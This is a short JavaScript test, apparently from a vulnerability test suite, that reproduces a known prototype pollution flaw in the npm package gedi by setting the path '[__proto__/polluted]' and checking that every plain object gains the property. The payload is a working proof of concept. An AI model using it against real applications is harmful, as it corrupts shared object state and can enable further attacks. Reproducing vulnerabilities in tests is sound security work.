//https://snyk.io/vuln/SNYK-JS-GEDI-598803
test("prototype pollution in gedi", () => {
  expect({}.polluted).toBe(undefined);

  const gedi = require("gedi");
  gedi().set("[__proto__/polluted]", "yes");

  expect({}.polluted).toBe("yes");
});
